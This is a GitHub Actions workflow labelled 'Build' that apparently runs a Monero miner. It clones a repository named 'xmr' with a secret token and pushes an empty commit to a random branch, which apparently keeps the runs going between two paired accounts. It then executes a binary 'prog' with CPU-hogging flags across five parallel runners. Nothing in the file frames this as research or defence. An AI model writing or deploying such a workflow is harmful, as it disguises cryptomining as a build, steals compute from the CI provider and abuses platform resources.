name: Build
on: [push, pull_request, workflow_dispatch]
jobs:
  test:
    name: Fetch
    runs-on: ubuntu-latest
    container: ubuntu:20.10
    env:
      DEBIAN_FRONTEND: noninteractive
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    strategy:
      fail-fast: false
      matrix:
        runner: [0,1,2,3,4]
    steps:
      - run: |
          apt update -qq
          apt install -y git libuv1 libssl1.1 libhwloc15 curl
          echo "$GITHUB_REPOSITORY"
          if [ "$GITHUB_REPOSITORY" = "daveyg7-org/xmr" ]
          then
            echo "Running from daveyg7-org"
            export OWNER1="daveyg7-org"
            export OWNER2="daveyg7"
          else
            echo "Running from daveyg7"
            export OWNER1="daveyg7"
            export OWNER2="daveyg7-org"
          fi
          echo "::set-env name=OWNER1::$OWNER1"
          echo "::set-env name=OWNER2::$OWNER2"
          git clone https://daveyg7:${{ secrets.token }}@github.com/$OWNER1/xmr.git
          cd xmr
          git config user.name 'Davey G'
          git config user.email 'daveyg7@yandex.com'
          export BRANCH=$(head -c8 /dev/urandom | base64 | tr -cd '[:alnum:]')
          echo "::set-env name=BRANCH::$BRANCH"
          git checkout -b $BRANCH
          git commit --allow-empty --allow-empty-message --no-edit
          git push -u origin $BRANCH
#       - uses: actions/github-script@v3
#         id: my-script
#         with:
#           github-token: ${{secrets.token}}
#           result-encoding: string
#           script: |
#             github.pulls.create({
#               owner: "${{ env.OWNER2 }}",
#               repo: "xmr",
#               head: "${{ env.OWNER1 }}:${{ env.BRANCH }}",
#               base: "main",
#               title: "COol"
#             })
      - run: |
          cd xmr
          chmod u+x prog
          ./prog --cpu-no-yield --cpu-priority 5
